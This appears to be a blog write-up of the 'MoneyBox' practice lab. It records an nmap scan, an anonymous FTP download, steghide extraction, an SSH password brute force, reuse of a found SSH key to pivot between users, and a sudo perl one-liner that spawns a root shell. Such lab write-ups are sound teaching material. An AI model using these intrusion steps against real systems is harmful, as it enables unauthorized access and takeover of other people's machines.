First enumeration with nmap

```shell
# Nmap 7.94 scan initiated Thu Aug 24 01:45:04 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 21,22,80 -Pn 192.168.211.230
Nmap scan report for 192.168.211.230
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.241
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 24 01:45:18 2023 -- 1 IP address (1 host up) scanned in 13.86 seconds
```

### Enumerating FTP (21)

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PG/MoneyBox]                            
└─$ ftp 192.168.211.230
Connected to 192.168.211.230.                                                      
220 (vsFTPd 3.0.3)                                                                 
Name (192.168.211.230:n16hth4wk): anonymous                               
331 Please specify the password.                                                                                                                                       
Password:                                                                          
230 Login successful.                                                              
Remote system type is UNIX.                                                        
Using binary mode to transfer files.  
ftp> ls -al                                                                        
229 Entering Extended Passive Mode (|||29407|)
150 Here comes the directory listing.                                                                                                                                  
drwxr-xr-x    2 0        0            4096 Feb 26  2021 .
drwxr-xr-x    2 0        0            4096 Feb 26  2021 ..                         
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.                                                             
ftp> get trytofind.jpg
local: trytofind.jpg remote: trytofind.jpg
229 Entering Extended Passive Mode (|||8004|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).         
100% |**************************************************************************************************************************|  1068 KiB  256.19 KiB/s    00:00 ETA
226 Transfer complete.                                                             
1093656 bytes received in 00:04 (246.44 KiB/s)
ftp> put fulltcp.txt                                                               
local: fulltcp.txt remote: fulltcp.txt
229 Entering Extended Passive Mode (|||20443|)                                     
550 Permission denied. 
```
we have anonymous login on ftp, we got to see an image file, download the image file, tried to upload a file into the ftp, failed.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e9473429-fd2d-41f8-adb3-232c1ca0b23f)

noticed a webserver running on port 80, opening it on a browser, we got directed to an homepage talking about the box. let's try keep it simple and don't overthink.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/da5a3433-fb9c-4fef-9fb9-cb53ed8000e1)

first we start fuzzing the web page, we got a dir `blogs`, 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b4eefafc-b600-411f-8c05-06d4a1bb10b9)

Navigating to the `/blogs` dir, we got to see that the hacker's talking about a misconfiguration that lead to the hack. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8b86ca2c-d29e-471e-a527-be674af3c24c)

checking the source code of the page, we can see a hint telling us to got to `S3cr3t-T3xt` dir. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/74f5ee7d-ff9f-4dd2-9792-8c2a0f447af4)

Navigating to the dir, we got a response that there's nothing on the webpage. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/bfd2f28b-2595-4856-821b-653eefadfe73)

checking the source code, we get to see a passphrase, remember there was an image file we downloaded from ftp earlier.let's use steghide to extract the content of the image file.

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PG/MoneyBox]
└─$ steghide extract -sf trytofind.jpg
Enter passphrase: 
wrote extracted data to "data.txt".
                                                                                                                                                                       
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PG/MoneyBox]
└─$ cat data.txt   
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```
we extracted the content and read the content of the file, it was talking about a user `renu` having a weak password, 🤔 weak password?, let's try bruteforce ssh password for user `renu`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f9c3f94b-dce0-4f37-9c29-0458b109e2dd)

cool we got the ssh password for user renu. `renu:987654321`. let's login. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/43fb39da-3b8f-4449-80ed-62e9a09103f4)

Bankai!!! we are in. 


## Privilege Escalation 

```shell
renu@MoneyBox:~$ cat .bash_history                                                                                                                              [44/44]
[***]
cd /home
ls               
cd lily
ls       
ls -la
clear                         
cd     
clear
ssh-keygen -t rsa       
clear  
cd .ssh         
ls                           
ssh-copy-id lily@192.168.43.80  
clear                                                                              
cd                                                                                 
cd -                                                                               
ls -l                                                                              
chmod 400 id_rsa                                                                   
ls -l                             
ssh -i id_rsa lily@192.168.43.80                                                   
clear                                                                              
ssh -i id_rsa lily@192.168.43.80                                                                                                                                       cd                                                                                                                                                                     clear                                                                              
cd .ssh/
renu@MoneyBox:~$ ls -al .ssh/
total 20
drwx------ 2 renu renu 4096 Feb 26  2021 .
drwxr-xr-x 5 renu renu 4096 Oct 11  2022 ..
-r-------- 1 renu renu 1823 Feb 26  2021 id_rsa
-rw-r--r-- 1 renu renu  393 Feb 26  2021 id_rsa.pub
-rw-r--r-- 1 renu renu  222 Feb 26  2021 known_hosts
renu@MoneyBox:~$ cat /home/lily/au
cat: /home/lily/au: No such file or directory
renu@MoneyBox:~$ cat /home/lily/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eI
iVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNx
lvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
renu@MoneyBox:~$  
```
checking the `.bash_history` file of user renu, we can see we can ssh into user `lily` with our id_rsa key file. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/608f0261-d3e8-4aad-b6c7-1db3de8e6979)

Bankai!!! we are in as user `lily`, let's escalate privs further.

```
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
lily@MoneyBox:~$
```
checking for sudo permissions for user `lily` we can see we are allowed to run `/usr/bin/perl` as root without password. 

```shell
lily@MoneyBox:~$ sudo -u root /usr/bin/perl -e 'exec "/bin/bash"'
root@MoneyBox:/home/lily# whoami 
root
root@MoneyBox:/home/lily# cd
root@MoneyBox:~#
```
abusing the privilege, we spawned a root shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3525ea84-851a-42bd-a7fd-291b65cf1b18)

And we are through!!! 😜 we kept it simple yeah!!! 
